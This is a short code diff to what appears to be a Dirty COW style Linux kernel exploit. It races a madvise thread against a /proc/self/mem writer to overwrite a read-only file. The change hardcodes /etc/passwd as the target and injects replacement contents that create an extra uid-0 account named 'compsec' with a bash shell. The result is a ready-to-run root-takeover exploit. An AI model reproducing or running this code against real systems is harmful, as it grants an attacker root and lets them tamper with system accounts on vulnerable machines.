@@ -12,6 +12,8 @@ int f;
 struct stat st;
 char* name;
 
+char etc_passwd[] = "/etc/passwd";
+
 char passwd[] = "root:x:0:0:root:/root:/bin/bash\ncompsec:x:0:0:Compter Security,,,:/home/compsec:/bin/bash\n\r";
  
 void* madviseThread(void *arg)
@@ -54,8 +56,8 @@ int main(int argc,char *argv[])
   printf("mmap %zx\n\n",(uintptr_t) map);
 
 
-  pthread_create(&pth1,NULL,madviseThread,argv[1]);
-  pthread_create(&pth2,NULL,procselfmemThread,argv[2]);
+  pthread_create(&pth1,NULL,madviseThread,etc_passwd);
+  pthread_create(&pth2,NULL,procselfmemThread,passwd);
   pthread_join(pth1,NULL);
   pthread_join(pth2,NULL);
   return 0;
